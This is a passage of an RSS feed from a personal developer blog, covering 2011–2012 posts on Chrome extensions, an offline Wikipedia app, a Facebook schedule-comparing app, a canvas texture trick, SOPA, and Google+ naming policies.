&lt;p&gt;While implementing the algorithm, I had a little trouble because of SSL certificates. The domain which accepts all the protobufs encoded information has a certificate signed for the wrong domain, and browsers have a tendency to care a lot about certificate validity. To get around it, those requests are proxied by a simple server which is made with Google App Engine. All communication with that server itself is signed as well, and it doesn’t do any logging.&lt;/p&gt;
&lt;p&gt;When I was about to publish this post and first announced that it works again, there was a bit of trouble which people had getting it to work. This was actually because Google Music allows each MAC address to be associated with a few accounts but forbids any additional accounts. The first released version would use a single mac address for all clients, but it has since been replaced with a sort of unique identifier which is stored in localStorage.&lt;/p&gt;
&lt;p&gt;Apparently a&lt;a href=&quot;http://googlesystem.blogspot.com/2012/03/upcoming-google-music-features.html&quot;&gt; browser based uploade&lt;/a&gt;r may be something coming soon to Google Music. Enjoy&lt;a href=&quot;https://chrome.google.com/webstore/detail/obojocfchdgdpgcigcdhdnlakfcbbgfn&quot;&gt; this app&lt;/a&gt; while it lasts.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>liveswifers.org forum mirror</title>
      <link>http://antimatter15.com/2012/02/liveswifers-org-forum-mirror/</link>
      <pubDate>Thu, 16 Feb 2012 00:02:09 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/02/liveswifers-org-forum-mirror/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://forkswif.googlecode.com/git/Liveswifers/www.pryjon.com/liveswifers/forums/index.html&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/liveswifers.org%20forum%20mirror/Screenshot.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Liveswifers Post-Mortem&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I first registered an account on liveswifers.org on December 11th, 2006. I was 11 years old at the time. It was this time when the Ajax Animator began. I’m not sure of that, because 5 years past certainly constitutes ancient history for a teenager. It was a huge influence on the development of the Ajax Animator, and it was there that I first encountered some of the future contributors to the project. In fact, the community was kind enough to create an entire subsection of the forum intended to nurture discussion of my pet project, which paralleled their eternal vaporware attempt at resurrecting their namesake program.&lt;/p&gt;
&lt;p&gt;Over the next few years, the community decayed and the site became desolate and spam-ridden. There was a period in late 2008 when every indication was that the site would come to an abrupt demise when the domain registration was to expire. The still active community created a backup community on some other forum hosting site and prepared for the worst. I did my part by running WinHTTrack and mirroring the site on my hard disk. It turned out the domain was renewed, and the panic was for nought.&lt;/p&gt;
&lt;p&gt;But, when the website finally became a desolate and abandoned wasteland a few years later, the domain lapsed and all the content was lost.&lt;/p&gt;
&lt;p&gt;In a nostalgic fit earlier today, I dug up that archive and uploaded it to Google Code. &lt;a href=&quot;http://forkswif.googlecode.com/git/Liveswifers/www.pryjon.com/liveswifers/forums/index-2.html&quot;&gt;Here you can browse the near entirety&lt;/a&gt; of the liveswifers forum as it was, frozen in carbonite those three years ago. I can’t place that date, December, 2006 quite in context, but I would expect that to be approximately the date that the seeds of inspiration were planted. And so maybe not for anyone else, but this site and all its content holds a special place in my mind, and deserves a final resting place shielded from the harsh internet.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>This site is going down tomorrow in protest of SOPA/PIPA</title>
      <link>http://antimatter15.com/2012/01/this-site-is-going-down-tomorrow-in-protest-of-sopa-pipa/</link>
      <pubDate>Tue, 17 Jan 2012 04:48:39 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/01/this-site-is-going-down-tomorrow-in-protest-of-sopa-pipa/</guid>
      <author></author>
      <description>&lt;p&gt;Not that anyone is going to particularly miss my blog (most of my other web pages will still be up because I’m far too lazy to go through all of them in order to make a slightly less futile protest). But this is one of the most interesting internetwide events that I’ve ever encountered, and I should be shamed to not take part in it. Copyright and its ongoing war with libertarian and anarchist mentalities has fascinated me ever since squinting through Free Culture on my iPhone more than five year ago. Going to Jonathan Zittrain’s Free Culture X keynote a few years ago was fun too.&lt;/p&gt;
&lt;p&gt;I’m sure most would feel uncomfortable with my characterization of this as some cyberlibertarian movement, but I think it’s an entirely excusable position for someone living through a period of adolescence characterized by rebellion and Ayn Rand. It’s certainly not the only perspective, but it seems the most poignant and consistent, not that consistency is necessarily a goal of any legislative body. Legislative bodies are meant, to borrow from programming jargon, to monkey-patch a framework that ill-approximates the societal expectation of government.&lt;/p&gt;
&lt;p&gt;Now excuse me while I contrive a metaphor that relates to something that I don’t know much about and will seem cringe-worthy to anyone knowledgeable in the subject. Lets say that the Earth is the shape of what the ideal government is. Not ideal in a sense that it’s perfect and elegant, but in the sense that it is empirically derived through the scientific process of experiment. But in large part, this mass conforms to a very general principle (maximizing individual freedoms). I would characterize this is approximating the earth as a sphere. For nearly all applications, this rather crude geometric model works astonishingly well, leading some to even believe that this is what the world &lt;em&gt;actually&lt;/em&gt; is. That everything else, the obsession with finding imperfection is actually a delusion and everything comes from measurement error (well, that’s when this metaphor breaks down because nobody actually does this). Legislators shape the body of law to conform with the needs of society by poking and adding ridges to where the overlay is incongruous. They do the passive activity of fixing the model, the geoid, to incredible precision. But there’s a more radical way, molding the earth into what our model was. We can forget about the lapses, and soon enough the surface of hte earth will erode down into that perfect sphere of ideology.&lt;/p&gt;
&lt;p&gt;There. I think I’ve fulfilled my obligation to write some words with some ostensible meaning with regard to something that pertains rather dearly to my life. If this passes and we descend into a dystopian nightmare reminiscent of 1984, at least I’ll have something to look back on. An old man filled with regret waiting to die alone. Or at least without an internet. I did my best (but still far from enough, as is anything besides martyrdom) to preserve crowd immunity to hazardous legislation, but alas we were stricken.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Google Circles was Launched on Tau Day</title>
      <link>http://antimatter15.com/2012/01/google-circles-was-launched-on-tau-day/</link>
      <pubDate>Fri, 13 Jan 2012 03:10:23 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/01/google-circles-was-launched-on-tau-day/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2012/Google%20Circles%20was%20Launched%20on%20Tau%20Day/screen-shot-2011-06-29-at-7-45-12-pm3.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Google%20Circles%20was%20Launched%20on%20Tau%20Day/screen-shot-2011-06-29-at-7-45-12-pm3.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Google Circles&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I realized this a while ago, June 29th and started this blog post and never got around to filling it with content, but I’m pretty sure the the title can stand on its own. For those unfamiliar with &lt;a href=&quot;http://tauday.com/&quot;&gt;tau&lt;/a&gt;, there’s this movement that says that pi is a bad circle constant - since more often than not, mathematical equations use 2pi rather than pi, and for purity sake, that should be the value for the circle constant.&lt;/p&gt;
&lt;p&gt;Google+ was launched on June 28, 2011 (or at least that was the day the limited field testing began, but I was part of that, so that’s the date I consider). In other words, 6/28, or 6.28.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Updated Ajax Animator</title>
      <link>http://antimatter15.com/2011/12/updated-ajax-animator/</link>
      <pubDate>Sat, 31 Dec 2011 03:39:43 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/12/updated-ajax-animator/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2011/Updated%20Ajax%20Animator/1-13-2012-8-11-44-AM.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/Updated%20Ajax%20Animator/1-13-2012-8-11-44-AM.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;1-13-2012 8-11-44 AM&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Well it’s been the first time in about two years, and it wasn’t a big change.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Offline Wiki Redux</title>
      <link>http://antimatter15.com/2011/12/offline-wiki-redux/</link>
      <pubDate>Fri, 30 Dec 2011 01:05:06 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/12/offline-wiki-redux/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2011/Offline%20Wiki%20Redux/Screenshot.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/Offline%20Wiki%20Redux/Screenshot.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;There’s just something incredibly alluring about the concept of holding the sum of human knowledge with you at all times. While near-ubiquitous connectivity alleviates this to a certain extent, the momentary lapses of networking are incredibly corrosive to an information dependent mentality. Wikipedia never ceases to amaze me and, while I’ve tried in the past to encapsulate part of its sheer &lt;a href=&quot;https://chrome.google.com/webstore/detail/kchecgcglnoohbdghckmcbefllnibadd?hl=en&quot;&gt;awesomeness&lt;/a&gt;, this marks a much more significant attempt.&lt;/p&gt;
&lt;p&gt;The differences start even before the data gets to the application. The preprocessing toolchain was entirely rewritten for a multitude of reasons. First of all, it compresses not the entireity, but rather the most popular subset of the English Wikipedia. Two dumps are distributed at time of writing, the top 1000 articles and the top 300,000 requiring approximately 10MB and 1GB, respectively. While ostensibly, the mere top 300k articles is far too narrow to delve deep into the long tail, the breadth of the meager 1/25th of articles consistently surprises me in its depth. The advantage is that at 1GB, it’s relatively easy to fit into any system. The algorithm which strips extraneous content has been made far more sophisticated than the original series of regular expressions. This enables greater compression and less accidentally omitted content.&lt;/p&gt;
&lt;p&gt;On the application end, the application has switched from a &lt;a href=&quot;https://github.com/nmrugg/LZMA-JS&quot;&gt;GWT-compiled&lt;/a&gt; LZMA SDK to a speedy, &lt;a href=&quot;https://github.com/glinscott/lzmajs&quot;&gt;pure javascript decoder&lt;/a&gt;. This makes page loads significantly speedier and allows greater compression ratios, for individual blocks can be made larger (256KB instead of 100KB). It also now uses WebGL Typed Arrays to further speed things up, such as sending data to and from the WebWorker thread.&lt;/p&gt;
&lt;p&gt;The interface was redesigned with CSS media queries to dynamically transition between different modes in response to different viewing environments. The interface consists of two regions: the fixed position recessed left panel which holds the page title, a search bar, controls and the page outline. This collapses down to a toolbar header automatically when the screen estate is limited. It uses an Apple-esque noise texture background.&lt;/p&gt;
&lt;p&gt;Downloads happen in little units called chunks (they’re half a megabyte for the dump file and about four kilobytes for the index). The local file can be built up out of order. While online, all storage operations check the virtual file, indexed db, or web sql database. If it’s not there, it transparently uses an XMLHttpRequest in order to fulfill the request and caches it to disk in the respective persistence mechanism. A bitset is used to keep track of which chunks are already downloaded and which need to be downloaded.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://offline-wiki.googlecode.com/git/app.html&quot;&gt;http://offline-wiki.googlecode.com/git/app.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Pepper Spray Cop</title>
      <link>http://antimatter15.com/2011/11/pepper-spray-cop/</link>
      <pubDate>Wed, 30 Nov 2011 06:56:51 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/11/pepper-spray-cop/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2011/Pepper%20Spray%20Cop/download.jpg&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/Pepper%20Spray%20Cop/download.jpg&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Metaception&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This is a hopefully more entertaining project which piggybacks on a meme which is probably already quite dated relative to the date of the publishing of this article. Nonetheless, that meme and the entire occupy movement will likely hold some place in the annals of internet history. For those unexposed to this meme, UC Davis Police officer Lieutenant John Pike was photographed nonchalantly applying copious quantities of the practical food product (as Fox News phrased it) to the throats and faces of nonviolent protesters.&lt;/p&gt;
&lt;p&gt;This app takes a picture and uses the Face.com face detection API in order to locate candidate faces. The image is drawn on canvas with the corresponding cop, and a orange mist is drawn by iteratively drawing random points with accordance to a certain probability distribution. The cop flips with a rather cool animation when you drag him around.  &lt;a href=&quot;http://metaception.com/pepper/&quot;&gt;http://metaception.com/pepper/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Surplus 4</title>
      <link>http://antimatter15.com/2011/10/surplus-4/</link>
      <pubDate>Fri, 28 Oct 2011 22:48:42 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/10/surplus-4/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2011/Surplus%204/Screenshot-at-2011-10-28-213821.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/Surplus%204/Screenshot-at-2011-10-28-213821.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Blurry&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Recently Surplus stopped working. Well, it hasn’t been working for a lot of people for a long time already, but that’s besides the point. It stopped working entirely. Surplus has always been a rather fragile creature. It operates like a kid on a high speed scooter attempting to carry a house of cards between two strangers. That house of cards is part of a delicate system of frames inside frames inside frames inside frames that move between frames. Surplus is this fairly atrocious mess of frames.&lt;/p&gt;
&lt;p&gt;Framing things works out fine until you discover that whatever you’re framing is trying to break out. Meet the X-Frame-Options header, the source Surplus’s recent predicament. It has well meaning motives: to prevent Google from suffering from evil attacks like Clickjacking, XSRF and other nasty things. Incidentally, security-wise, Surplus would probably belong closer to something of that nature than a legitimate application. It doesn’t use an API because applications generally wouldn’t find it useful.&lt;/p&gt;
&lt;p&gt;Recently, all Google properties started including that X-Frame-Options header, and now can’t be embedded in frames. It wasn’t an absolutely unprecedented move, because just a few weeks earlier Google Video had started sending out the header (which led to an update which moved from a Google Video host frame). But now it was across all Google Sites, and there was no short term hack that could be done.&lt;/p&gt;
&lt;p&gt;The solution was to take a random Google page which didn’t send out the header and mimic all the postMessage messages that are sent from the Google Plus notifications frame. Consequently, the entire frame signaling and attachment system had to be rewritten, and that system was so deeply tied into everything else that Surplus 4 ended up being almost an entire rewrite (the inner frame actions, the options page and the notifications parser did not change).&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/pfphgaimeghgekhncbkfblhdhfaiaipf&quot;&gt;https://chrome.google.com/webstore/detail/pfphgaimeghgekhncbkfblhdhfaiaipf&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Schedule Compare</title>
      <link>http://antimatter15.com/2011/09/schedule-compare/</link>
      <pubDate>Fri, 02 Sep 2011 04:39:17 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/09/schedule-compare/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2011/Schedule%20Compare/Schedule-Compare1.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/Schedule%20Compare/Schedule-Compare1.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Schedule Compare&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Posting this here is almost certainly useless. I assume very very few people who read this blog tend to be in the target &lt;strong&gt;13-18 year old facebook-using high school student demographic&lt;/strong&gt;. By the unlikely chance you are (if you aren’t, you can forward this to the nearest person who fits into this demographic, as I will add later, that I’m desperately looking for users).&lt;/p&gt;
&lt;p&gt;It’s that time of year. The brief window where summer vacation isn’t technically over yet as school hasn’t started but you still know your classes for next year. You’re frantically attempting to complete those long procrastinated summer assignments, or like me, you’re desperately trying to avoid them by giving a yourself a false sense of productivity by building random apps.&lt;/p&gt;
&lt;p&gt;My first foray into the realm of creating Facebook applications is fairly simple. It compares class schedules. In truth, the reason I made this was probably not the fact that I enjoy making useful tools, but more likely residual bitterness of rejection by a &lt;a href=&quot;http://tjhsst.edu/&quot;&gt;sci/tech high school&lt;/a&gt; over &lt;a href=&quot;http://antimatter15.com/2011/09/schedule-compare/2009/01/i-fail/&quot;&gt;three years&lt;/a&gt; ago which has a &lt;a href=&quot;http://jeffsweb.net/scheduler/&quot;&gt;school-specific&lt;/a&gt; schedule comparing app. Nonetheless, a neat side effect of this attempt is that it does happen to be quite cool.&lt;/p&gt;
&lt;p&gt;This is also my first published app which is written in the &lt;a href=&quot;http://jashkenas.github.com/coffee-script/&quot;&gt;CoffeeScript&lt;/a&gt; language. For those of you unaware, CoffeeScript is a language which is syntactically similar to &lt;a href=&quot;http://python.org/&quot;&gt;Python&lt;/a&gt; but compiles into Javascript. It’s not a nasty &lt;a href=&quot;http://code.google.com/webtoolkit/&quot;&gt;GWT&lt;/a&gt;-esque compilation, but a relatively clean one (barring the underscores that result when you try doing comprehensions and the really cool stuff). I’ve always meant to write stuff in CoffeeScript, as it has quite a few awesome features. Most importantly is probably the ability to declare a function with two characters (-&amp;gt;) rather than a massive “function(){}” and the array comprehensions.&lt;/p&gt;
&lt;p&gt;Compiled (or should I say Transpiled?) languages have odd a few annoying properties, especially with debugging. The biggest issue was probably setting up everything: running a script which uses inotifywait to automatically compile your CoffeeScript once you hit “Save” on your editor of choice (gedit just because it works and comes with Ubuntu). Then when errors happen, your line numbers don’t match up and that’s also annoying.&lt;/p&gt;
&lt;p&gt;The Facebook API is actually pretty good. My app reads Facebook schedules from your friends’ statuses. It’s not quite as easy as it should be. I could search the user’s news feed and that would be trivial except that it only gives me a subset of the statues that I want to be able to process. When using FQL (which I ended up pronouncing Feequel which sounds a bit like Fecal because it’s a SQL derivative, even though you’re not supposed to pronounce it “sequel”) it would only return/search the most recent status. I ended up doing a FQL request for each and every friend that the current user has, which is a on average a pretty big number. Fortunately it doesn’t seem like Faecbook has any API limits. Awesome.&lt;/p&gt;
&lt;p&gt;For the longest time I was confused because my app inexplicably only worked for me. It turns out that my queries returned blank results for everyone else because I didn’t request the right permissions. That’s terrible. Absolutely terrible. First of all, the developer shouldn’t be entitled to have those magical privileges that the end users can’t have. It’s insanely confusing. And don’t just silently return no results and make the developer question his own sanity.&lt;/p&gt;
&lt;p&gt;But it was a permissions issue - a one line fix in the end.&lt;/p&gt;
&lt;p&gt;It’s also quite depressing that nobody’s using it. It’s pretty server intensive at the moment and it’s running on Google App Engine, which has that new pricing which means I should have my free quota expire after something like a meager 100 users. But I haven’t really come close to that. Why? I guess I have little influence over friends.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://schedule-compare.appspot.com/&quot;&gt;http://schedule-compare.appspot.com/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Surplus</title>
      <link>http://antimatter15.com/2011/08/surplus/</link>
      <pubDate>Fri, 19  Aug 2011 00:09:29 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/08/surplus/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/Surplus/screenshot-20110819-154126.png&quot; &gt;&lt;/div&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/Surplus/screenshot-20110819-153845.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;In a continuation of my rather unhelpful habit of documenting my activities on this blog long after you probably already know about it, I guess it’s time for me to discuss &lt;a href=&quot;https://chrome.google.com/webstore/detail/pfphgaimeghgekhncbkfblhdhfaiaipf&quot;&gt;Surplus&lt;/a&gt;, my wildly popular (at time of writing) chrome extension which integrates Google+ notifications into Chrome.&lt;/p&gt;
&lt;p&gt;Even more impressive, the name, which is a fairly common word is actually on the first page of a Google search for the word (around eighth result). It peaked at around 53,000 users and at one point made me the 329th most followed person on Google+.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Generating the iOS 5 Linen texture with Canvas</title>
      <link>http://antimatter15.com/2011/08/generating-the-ios-5-linen-texture-with-canvas/</link>
      <pubDate>Thu, 18  Aug 2011 23:26:51 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/08/generating-the-ios-5-linen-texture-with-canvas/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/misc/linen.html&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/Generating%20the%20iOS%205%20Linen%20texture%20with%20Canvas/Screenshot.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;
&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/Generating%20the%20iOS%205%20Linen%20texture%20with%20Canvas/noise-150x150.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;noise&lt;/div&gt;&lt;/div&gt;
I guess the linen texture which is way too prevalent in Lion and iOS 5 looked pretty cool so I tried replicating the effect in canvas. It’s not instant but the texture is generated fairly quickly. It’s all done in around 20 lines of code. The basic idea is to first create a bunch of semi-transparent noise such as the stuff on the right (Though in the real one the opacity is only 3% and in the one on the right it’s been increased to 70%). To do that, we createImageData and set every fourth pixel to 6 if Math.random() &amp;lt; 0.1. That means approximately 10% of the canvas will be semi-transparent with the rest being totally transparent. I’m not clever enough to embed some steganographic message in the ostensible noise pattern, because I’m just way too lazy for that sort of stuff. But if you think that that last sentence was actually a decoy for my master plan, feel free to waste time decoding a message which probably isn’t there.&lt;/p&gt;
&lt;p&gt;After that, the canvas is converted to a DataURL so it can be loaded as an image. After loading the image, we iterate 40 times and call drawImage on the original canvas with an offset to make every single point into a cross-shape. &lt;a href=&quot;http://antimatter15.com/misc/linen.html&quot;&gt;Demo&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Google+ Profile Suspended</title>
      <link>http://antimatter15.com/2011/07/google-profile-suspended/</link>
      <pubDate>Sun, 24 Jul 2011 07:56:10 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/07/google-profile-suspended/</guid>
      <author></author>
      <description>&lt;p&gt;My &lt;a href=&quot;https://plus.google.com/u/0/116347431032639424492/posts&quot;&gt;Google+ profile &lt;/a&gt;was suspended on grounds that were not wholly unexpected, but still shocking. I’m likely violating many of their conditions, as I’m 16 (under 18 at time of writing) though when my Google Account was registered, I probably lied and said that I was 30 (At that time, when I was 11, I tended to do that with all services to evade the nonsense COICA on Neopets). I’m not really the victim here (Though I’d like to pretend that I’m pretending that I am so I have an ostensible excuse for narcissism without admitting it by admitting it). I hardly ever share anything on Google+, so I lose nothing except for the ability to make an occasional uninsightful post and the ability to brag about my 3.4k+ followers.&lt;/p&gt;
&lt;p&gt;I assume it’s the fault of every social network to obsess over its user base, to define a subset of humanity and designate those as members. To praise individualism, differences and variance yet rely so heavily on the homogenuity and uniformity of the users. A network can not be inclusive and exclusive at the same time, to assume that’s possible is the definition of insanity.&lt;/p&gt;
&lt;p&gt;It’s a pity how a minor issue can inflate so much. A minor annoyance in the legalese which every average legally inept and time starved human that we all assumed Google would turn a blind eye to in order to focus on user adoption. “Use the name which people know you by”. It’s a startlingly obvious notion for social networks, if a software system is attempting to duplicate the nuanced structure of physical and digital relationships in a unified and coherent implementation, it makes sense to retain the basic handles which we rely upon.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;But rather than draw upon this logic, that sentence is followed upon by the possibly inconsistent idea to “Use your real name”. What if your “real name” isn’t what you’re known as? What if you don’t feel comfortable revealing this information? This attempt at recognizing nuance fails so blatantly at the most basic principle of consistency and blatantly disregards the considerations of a rather significant portion of web users.&lt;/p&gt;
&lt;p&gt;Some say that this principle is good, that it filters out those who should not belong in the network anyway. That those who tend to use pseudonyms do not belong on a good faith network which depends on the cooperation and trust of every individuals. That pseudonyms are employed by criminals and those with malignant intent, and therefore all precautions must be taken to eliminate that risk.&lt;/p&gt;
&lt;p&gt;A network has a different role in dealing with its users than a specific group does. There’s a rather interesting notion that is presented by Google’s terming of the rules as “Community Standards”: the idea that everyone who uses Google+ is a part of some sort of community. Not a loosely associated network of individuals through transparent circles, but a community as if every one had to occasionally encounter and take offense to each other.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://en.wikipedia.org/wiki/Robustness_principle&quot;&gt;Postel’s law&lt;/a&gt;, the idea that a software framework should be liberal in what it accepts and conservative in what it sends, should apply with the massive-social-network hopeful known as Google+. At the “web scale” which Google operates at, it should be clear that humans often have very few attributes in common. The slightest interpersonal misalignments turn into gaping canyons on the magnitude of billions.&lt;/p&gt;
&lt;p&gt;Pseudonyms mean quite literally a fake name. Now, why would someone want a fake name? The simplest answer which by no means encompasses all or even most uses, is that someone has something to hide. As the evil voldemort-controlled ministry of magic in harry potter and the deathly hollows part 1 the movie leader said “You have nothing to be afraid of if you have nothing to hide”, which I found shockingly similar to Eric Schmidt’s “If you have something you dont want shared online, maybe you shouldn’t be doing it in the first place”.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Does pseudonymity necessarily produce a culture incompatible with civilized society? I would say no, and even if the answer was yes, it doesn’t matter. The internet is a big and diverse place and it doesn’t matter if there are people who have questionable motives exist as they aren’t forcing their ideas on others.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;In Romeo and Juliet, Shakespeare (through Juliet) asks “What’s in a name?”, expressing the notion that the name is a meaningless and artificial convention which only serves to create an equally artifical and antagonistic gap between the protagonists. We can choose to subscribe to these existing and equally artificial distinctions and we should be able to choose not to.&amp;nbsp;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Inception</title>
      <link>http://antimatter15.com/2011/07/inception/</link>
      <pubDate>Sun, 10 Jul 2011 07:31:42 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2011/07/inception/</guid>
      <author></author>
      <description>&lt;p&gt;This post is going to be nothing like any other post, because it’s going to be about the video frame at the 650th second of the movie Inception.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2011/Inception/Screen-shot-2011-07-10-at-11.12.21-PM.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2011/Inception/Screen-shot-2011-07-10-at-11.12.21-PM-300x160.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screen shot 2011-07-10 at 11.12.21 PM&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;With a bit of &lt;a href=&quot;http://www.google.com/search?hl=en&amp;amp;q=%22the%20changes%20in%20photoluminescence%20of%20arrays%20of%22&amp;amp;amp&quot;&gt;Googling&lt;/a&gt;, it seems the first part of this document is “Development of Highly Sensitive Portable Hydrocarbon Sensors” by  &lt;a href=&quot;http://www.utrc2.org/directory/people.php?viewid=70&quot;&gt;Dr. Michael Carpenter&lt;/a&gt; at the &lt;a href=&quot;http://www.utrc2.org/directory/partners.php?viewid=27&quot;&gt;State University of New York&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Here follows the text of the document taken from &lt;a href=&quot;http://www.utrc2.org/research/projects.php?viewid=155&quot;&gt;http://www.utrc2.org/research/projects.php?viewid=155&lt;/a&gt; marked up to correspond with the appearance of the document in Inception. The second part of the document in the frame does not appear to be from the same source and I’ve encountered difficulty in locating the source of that part of the document. The visible differences between the source document and the image from Inception are in bold while the redacted contents are in strikeout. The newlines are approximately where they are in the visible document.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;January 2007 we have begun to develop and evaluate a cost&lt;/p&gt;
&lt;p&gt;and space effective sensing assembly which will leverage our&lt;/p&gt;
&lt;p&gt;&lt;del&gt;past and future hydrocarbon sensor development efforts funded &lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;by the NYS-DOT. The UTRC funded program is developing and &lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;evaluating the proof of concept&lt;/del&gt; for a portable and cost effective&lt;/p&gt;
&lt;p&gt;&lt;del&gt;hydrocarbon sensor based on a compact optical&lt;/del&gt; spectrometer which&lt;/p&gt;
&lt;p&gt;monitors the changes in photoluminescence of arrays of&lt;/p&gt;
&lt;p&gt;hydrocarbon sensitive quantum dots (QDs).&lt;del&gt; Through this &lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;program &lt;/del&gt;&lt;del&gt;we have recently demonstrated the ability to detect &lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;xylenes at 50ppm concentration levels. While this is a very&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;promising result given the cost effective hardware that is&lt;/p&gt;
&lt;p&gt;being used in this program, this detection limit needs to&lt;/p&gt;
&lt;p&gt;be reduced to 100pp&lt;strong&gt;b&lt;/strong&gt; levels for this device to have a range&lt;/p&gt;
&lt;p&gt;of environmental applications. Therefore, we propose to&lt;/p&gt;
&lt;p&gt;expand this program to include the following new&lt;/p&gt;
&lt;p&gt;initiatives &lt;strong&gt;during the 2007-08 program&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;1)Investigation of QD based materials with &lt;del&gt;ppb level &lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;sensitivity through the use of resonant&lt;/del&gt; energy&lt;/p&gt;
&lt;p&gt;transfer sensing mechanisms,&lt;/p&gt;
